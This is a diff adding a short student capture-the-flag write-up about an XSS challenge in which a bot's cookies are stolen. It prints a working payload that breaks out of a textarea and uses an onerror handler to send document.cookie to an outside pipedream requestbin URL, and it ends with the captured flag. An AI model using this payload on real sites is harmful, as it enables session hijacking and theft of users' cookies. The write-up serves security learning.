@@ -1,0 +1,16 @@
+I need to retrieve the cookies of the bot as in the challenges done during the semester.
+For this purpose, I utilized a requestbin in order to collect the action forced by the script of XSS.
+
+In a JavaScript editor I put:
+
+const var2 = {"players":[{"name":"Player1","level":6,"bufs":0,"rbufs":0,"note": '</textarea><audio src = \"pwned\" onerror = "requestbin = \'https://enzms4u03sxx5xq.m.pipedream.net/\'; target = requestbin.concat(document.cookie); window.open(target);"/>'}, {"name":"Player2","level":1,"bufs":0,"rbufs":0,"note":" "}]}
+console.log(btoa(JSON.stringify(var2)))
+
+in order to retrieve the full link, with the script, in order to trigger the theft of the cookies of the user that visites the page.
+
+The requestbin will collect the cookies of the bot when I send the link to it, so I will be able to see them.
+They will contain the flag!
+
+I will retrieve
+    https://enzms4u03sxx5xq.m.pipedream.net/flag=flag%7Byou_got_my_cookie_i_amnot_playing_withu_anymore!%7D
+        -> flag{you_got_my_cookie_i_amnot_playing_withu_anymore}
